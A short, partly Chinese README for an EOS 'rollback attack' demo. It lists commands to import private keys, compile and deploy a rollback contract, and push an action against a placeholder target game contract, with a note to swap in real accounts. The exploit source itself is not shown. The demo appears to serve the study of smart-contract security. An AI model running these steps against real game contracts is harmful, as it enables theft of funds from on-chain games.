# Run 'rollback' demo
EOS Rollback回滚攻击实例
```
//mac
npm install -g js4eos
//ubuntu
sudo npm install -g js4eos
js4eos wallet create
//请一个一个导入下面用到的账号的私钥
js4eos wallet import your_private_key
js4eos compile -o rollback/rollback.wasm rollback/rollback.cpp
js4eos compile -g rollback/rollback.abi rollback/rollback.cpp
js4eos set contract contractaccount rollback
#assign eosio.code permission before push action
js4eos push action contractaccount dream '[ "targetgamecontract", "1.0000 EOS", "game memostring" ]' -p contractaccount
#上面的各种账号请更改为你的真实账号
```
如果使用cleos程序，只需将上面的js4eos替换为cleos即可<br>

如果你在linux/mac下且有本地nodeos可以使用run.sh脚本一键执行
```
#install js4eos if not
sudo npm install -g js4eos
#run
./run.sh
```
# details(详情)
<a href="https://blog.csdn.net/ITleaks/article/details/84317171">
https://blog.csdn.net/ITleaks/article/details/84317171
</a>